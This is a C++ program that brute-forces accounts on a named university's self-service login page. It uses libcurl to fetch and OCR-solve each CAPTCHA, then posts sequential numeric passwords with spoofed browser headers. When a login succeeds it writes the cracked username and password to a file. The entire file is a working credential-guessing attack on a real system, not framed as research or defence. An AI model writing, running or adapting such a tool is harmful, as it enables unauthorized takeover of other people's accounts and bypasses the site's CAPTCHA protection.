//////////////////////////////////////
// !!!!!! COPY !!!!!!!!!!!!!!!!!!!!!!!
#include <iostream>
#include <iomanip>
#include <stdio.h>
#include <string.h>
#include <string>
#include <sstream>
#include <stddef.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <curl/curl.h>
#include "CST-self-ocr.hpp"
#include "password.hpp"

using namespace std;

const char* post_url             =  "http://self.cust.edu.cn/selfservice/login.jsf";
const char* get_url              =  "http://self.cust.edu.cn/selfservice/code.jsp";
const char* cookie_file_name     =  "./self_cookie.txt";
const char* username             =  "youandme";
const char* password             =  "aresame";

const char* usertype             =  "1";

long times                       =  5L;
long start_pass                  =  0L;

int pass_length                  =  6;

bool is_debug                    =  false;
bool is_remove                   =  false;

string code;
string content;
string strpass;


////////////////////////////
// X2X /////////////////////
string i2s( int i ) {
    stringstream ss;
    ss << i;
    return ss.str();
}

string l2s( long l ) {
    stringstream ss;
    ss << l;
    return ss.str();
}

char* i2c( int i ) {
    stringstream str;
    str << i;
    return (char*)str.str().data();
}

long c2l( const char* ca ) {
    long value;
    stringstream str;
    str << ca;
    str >> value;
    return value;
}

long s2l( string str ) {
    long value;
    stringstream ss;
    ss << str;
    ss >> value;
    return value;
}

////////////////////////////////
// GET NAME  ///////////////////
string get_time( bool is_dir = false ) {
    time_t rawtime;
    struct tm * timeinfo;
    char buffer[80];
    
    time( &rawtime );
    timeinfo = localtime( &rawtime );
    
    if ( is_dir ) {
        strftime( buffer, 80, "%Y%m%d", timeinfo );
    } else {
        strftime( buffer, 80, "%Y-%m-%d-%H-%M-%S", timeinfo );
    }
    
    return string( buffer );
}

string get_file_name( long i, string path = "", string extension_name = ".jpg" ) {

    string file_name = "";
    
    if ( !path.empty() ) {
        file_name.append( path );
    }    

    file_name.append( get_time() );
    file_name.append( "-" );
    file_name.append( i2s(i) );
    file_name.append( extension_name );
    
    return file_name;
}

string get_dir_name( ) {
    string dir_name = "";
    dir_name += get_time( true );
    dir_name += "/";
    return dir_name;
}

string get_debug_file_name() {
    string name = "";
    name += get_time( true );
    name += ".debug";
    
    return name;
}


//////////////////////////////////////
// CONTENT  //////////////////////////
    
void reset_content() {
    content = "";
    content += "cmdForm%3Ausername=";
    content += username;
    content += "&cmdForm%3Apassword=";
    content += password;
    content += "&cmdForm%3Acode=";
    content += code;
    content += "&cmdForm%3Ausertype=";
    content += usertype;
    content += "&cmdForm%3A_idJsp34=%E7%99%BB%E5%BD%95&cmdForm_SUBMIT=1&jsf_sequence=1&cmdForm%3A_link_hidden_=";
}

////////////////////////////////////////
// WRITE DATA FUNCTION /////////////////
size_t write_callback( void* ptr, size_t size, size_t nmemb, FILE *data ) {
    size_t realsize = size * nmemb;
    if ( is_debug ) {
        cout << "\t==== WRITE CALLBACK" << endl;
        cout << "\tsize: " << setw(5) << size << endl;
        cout << "\tnmemb:" << setw(5) << nmemb << endl;
    }
    
    /*
    static int first_time=1;
    char outfilename[FILENAME_MAX] = "body.out";
    static FILE *outfile;
    size_t written;
    if (first_time) {
        first_time = 0;
        outfile = fopen(outfilename,"w");
        if (outfile == NULL) {
            return -1;
        }
        fprintf(stderr,"The body is <%s>\n",outfilename);
    }
    written = fwrite(ptr,size,nmemb,outfile);
    return written;
    */
    
    const char* value = (const char*) ptr;
    string str = value;
    string str_red = "color:red";
    string str_wrong_password = "\345\257\206\347\240\201\351\224\231\350\257\257";
    string str_no_user = "\347\224\250\346\210\267\344\270\215\345\255\230\345\234\250";
    if ( is_debug && str.find( str_red ) != string::npos ) {
        cout << "\tCOLOR RED!" << "<<<<< <<<<< <<<<< <<<<< <<<<< <<<<< <<<<<" << endl;
    }
    if ( str.find( str_no_user ) != string::npos ) {
        cout << "\tFIND: no user" << endl;
    } else if ( str.find( str_wrong_password ) != string::npos ) {
        cout << "\tFIND: wrong password!" << endl;
    }
    // cout << str << endl;
    if ( is_debug ) {
        cout << "\t------------------" << endl;
    }

    return realsize;

}

///////////////////////////////////////
// MAIN ///////////////////////////////
int main( int argc, char** argv ) {
    // Check for the options:
    const char* post_url_opt = "--post-url=";
    int post_url_opt_len     = (int)strlen( post_url_opt );
    const char* username_opt = "--username=";
    int username_opt_len     = (int)strlen( username_opt );
    const char* password_opt = "--password=";
    int password_opt_len     = (int)strlen( password_opt );
    const char* code_opt     = "--code=";
    int code_opt_len         = (int)strlen( code_opt );
    const char* usertype_opt = "--usertype=";
    int usertype_opt_len     = (int)strlen( usertype_opt );
    const char* is_debug_opt = "--debug";
    int is_debug_opt_len     = (int)strlen( is_debug_opt );
    const char* times_opt    = "--times=";
    int times_opt_len        = (int)strlen( times_opt );
    const char* start_pass_opt = "--start-pass=";
    int start_pass_opt_len   = (int)strlen( start_pass_opt );
    const char* is_remove_opt = "--remove";
    int is_remove_opt_len     = (int)strlen( is_remove_opt );
    const char* pass_length_opt = "--pass-length=";
    int pass_length_opt_len = (int)strlen( pass_length_opt );
    
    // Get the options:
    for ( int i = 0; i < argc; ++i ) {
        if ( strncmp( argv[i], post_url_opt, post_url_opt_len ) == 0 ) {
            post_url = argv[i] + post_url_opt_len;
        } else if ( strncmp( argv[i], username_opt, username_opt_len ) == 0 ) {
            username = argv[i] + username_opt_len;
        } else if ( strncmp( argv[i], password_opt, password_opt_len ) == 0 ) {
            password = argv[i] + password_opt_len;
        } else if ( strncmp( argv[i], code_opt, code_opt_len ) == 0 ) {
            code = argv[i] + code_opt_len;
        } else if ( strncmp( argv[i], usertype_opt, usertype_opt_len ) == 0 ) {
            usertype = argv[i] + usertype_opt_len;
        } else if ( strncmp( argv[i], is_debug_opt, is_debug_opt_len ) == 0 ) {
            is_debug = true;
        } else if ( strncmp( argv[i], times_opt, times_opt_len ) == 0 ) {
            times = c2l( argv[i] + times_opt_len );
        } else if ( strncmp( argv[i], start_pass_opt, start_pass_opt_len ) == 0 ) {
            start_pass = c2l( argv[i] + start_pass_opt_len );
        } else if ( strncmp( argv[i], is_remove_opt, is_remove_opt_len ) == 0 ) {
            is_remove = true;
        } else if ( strncmp( argv[i], pass_length_opt, pass_length_opt_len ) == 0 ) {
            pass_length = s2i<int>( argv[i] + pass_length_opt_len );
        }
    }
    
    struct curl_slist *chunk = NULL, *postchunk = NULL;
        
    chunk = curl_slist_append( chunk, "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100401 Ubuntu/9.10 (karmic) Firefox/3.5.9" );
    chunk = curl_slist_append( chunk, "Accept: image/png,image/*;q=0.8,*/*;q=0.5" );
    chunk = curl_slist_append( chunk, "Accept-Language: en-us,en;q=0.5" );
    chunk = curl_slist_append( chunk, "Accept-Encoding: gzip,deflate" );
    chunk = curl_slist_append( chunk, "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" );
    chunk = curl_slist_append( chunk, "Keep-Alive: 300" );
    chunk = curl_slist_append( chunk, "Connection: keep-alive" );
    chunk = curl_slist_append( chunk, "Referer: http://self.cust.edu.cn/selfservice/login.jsf" );
    
    postchunk = curl_slist_append( postchunk, "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100401 Ubuntu/9.10 (karmic) Firefox/3.5.9" );
    postchunk = curl_slist_append( postchunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" );
    postchunk = curl_slist_append( postchunk, "Accept-Language: en-us,en;q=0.5" );
    postchunk = curl_slist_append( postchunk, "Accept-Encoding: gzip,deflate" );
    postchunk = curl_slist_append( postchunk, "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" );
    postchunk = curl_slist_append( postchunk, "Keep-Alive: 300" );
    postchunk = curl_slist_append( postchunk, "Connection: keep-alive" );
    postchunk = curl_slist_append( postchunk, "Referer: http://self.cust.edu.cn/selfservice/login.jsf" );
    postchunk = curl_slist_append( postchunk, "Content-Type: application/x-www-form-urlencoded" );
    
    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    if ( !curl ) {
        cout << "cURL init error!" << endl;
        return ( -1 );
    }
    
    // DEBUG FILE
    FILE *debug_fp;
    debug_fp = fopen( get_debug_file_name().c_str(), "a+" );
    
    for ( long i = 0L; i < times; ++i ) {
        cout << "################## ################## " << i << " ################## ##################" << endl;
        const char* file_name = get_file_name( i ).c_str();
        string name(file_name);
        const char* image_file_name = name.c_str();
        
        if ( is_debug ) {
            cout << "\tfile name: " << file_name << endl;
        }
        
        FILE *fp;
        fp = fopen( file_name, "wb" );
        if ( !fp ) {
            cout << "File: [" << file_name << "] can't be opened!" << endl;
            exit( EXIT_FAILURE );
        }
        
        // FIRST: get login.jsf
        if ( i == 0 ) {  // get the first cookie
            if ( is_debug ) {
                cout << "==== FIRST ====" << endl;
            }
            curl_easy_setopt( curl, CURLOPT_URL, post_url );
            curl_easy_setopt( curl, CURLOPT_HTTPHEADER, postchunk );
            curl_easy_setopt( curl, CURLOPT_WRITEFUNCTION, &write_callback );
            curl_easy_setopt( curl, CURLOPT_COOKIEFILE, cookie_file_name );
            curl_easy_setopt( curl, CURLOPT_COOKIEJAR, cookie_file_name );
            
            res = curl_easy_perform( curl );
            
            curl_easy_reset( curl );
        }
        
        // SECOND: get code.jsp
        curl_easy_setopt( curl, CURLOPT_COOKIEFILE, cookie_file_name );
        curl_easy_setopt( curl, CURLOPT_COOKIEJAR, cookie_file_name );
        curl_easy_setopt( curl, CURLOPT_HTTPHEADER, postchunk );
        curl_easy_setopt( curl, CURLOPT_WRITEFUNCTION, NULL );
        curl_easy_setopt( curl, CURLOPT_WRITEDATA, fp );
        curl_easy_setopt( curl, CURLOPT_URL, get_url );
        
        res = curl_easy_perform( curl );
        
        fclose( fp );
        if ( is_debug ) {
            cout << "==== SECOND ====" << endl;
            cout << "\timage file name: " << image_file_name << endl;
        }
        code = configuration( image_file_name );
                
        if ( is_debug ) {
            cout << "\tcode: " << code << endl;
        }        
        
        // reset the curl for not download login.jsf page
        curl_easy_reset( curl );
        
        // THIRD: post login.jsf
        // change password
        password = num2str( i+start_pass, pass_length ).c_str();
        strpass = password;  // copy password to string
        reset_content();
        if ( is_debug ) {
            cout << "==== THIRD ====" << endl;
            cout << "\tusername:  " << username << "\tpassword:  " << password << endl;
            cout << "\tcontent:" << endl;
            cout << "\t" << content << endl;
        }
        
        curl_easy_setopt( curl, CURLOPT_URL, post_url );
        curl_easy_setopt( curl, CURLOPT_WRITEFUNCTION, &write_callback );
        curl_easy_setopt( curl, CURLOPT_HTTPHEADER, postchunk );
        curl_easy_setopt( curl, CURLOPT_COOKIEFILE, cookie_file_name );
        curl_easy_setopt( curl, CURLOPT_COOKIEJAR, cookie_file_name );    
        // curl_easy_setopt( curl, CURLOPT_FOLLOWLOCATION, 1 );  // bounce through login to next page
        curl_easy_setopt( curl, CURLOPT_POSTFIELDS, content.c_str() );
        
        res = curl_easy_perform( curl );
        
        // show username and password
        cout << "\tusername:  " << username << "\tpassword:  " << strpass << endl;
        
        if ( CURLE_OK == res ) {
            long respcode;
            res = curl_easy_getinfo( curl, CURLINFO_RESPONSE_CODE, &respcode );
            
            if ( CURLE_OK == res && respcode ) {
                if ( is_debug ) {
                   cout << "\tresponse code: " << respcode << endl;
                }
                if ( respcode == 302 ) {
                    char* redirect_url;
                    
                    res = curl_easy_getinfo( curl, CURLINFO_REDIRECT_URL, &redirect_url );
                    if ( CURLE_OK == res ) {
                        cout << "\t302 CODE" << endl;
                        cout << "\tredirect URL: " << redirect_url << endl;
                    }
                    
                    // Save the result
                    fprintf( debug_fp, "time: %s\n", get_time( true ).c_str() );
                    fprintf( debug_fp, "username: %s\n", username );
                    fprintf( debug_fp, "password: %s\n", strpass.c_str() );
                    fprintf( debug_fp, "--------------------\n" );
                    
                    exit( EXIT_SUCCESS );
                }
            }
        } else {
            cout << "==== RES CODE ====" << endl;
            cout << res << endl;
        }
        
        // reset curl for not post code.jsp
        curl_easy_reset( curl );
        
        
        // remove image file
        if ( is_remove ) {
            if ( remove( image_file_name ) != 0 ) {
                cout << "Couldn't remove file: " << image_file_name << endl;
            }
        }
    }
    curl_easy_cleanup( curl );
    
    fclose( debug_fp );
    
    return 0;
}
